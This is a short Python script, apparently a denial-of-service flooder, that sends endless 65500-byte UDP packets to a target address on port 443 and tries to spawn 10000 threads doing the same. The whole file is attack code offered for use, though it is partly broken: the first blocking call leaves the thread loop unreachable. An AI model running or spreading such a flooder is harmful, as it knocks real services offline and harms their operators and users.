import random
from scapy.all import *
from colorama import Fore
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
port = 443

targetIP = ""
numberthreads = 10000


def pod(target):
    while True:
        ping = sock.sendto(bytes(65500), (target, port))
        print(ping)


pod(targetIP)


for i in range(numberthreads):
    thread = threading.Thread(target=pod, args=(targetIP,))
    thread.daemon = True
    thread.start()
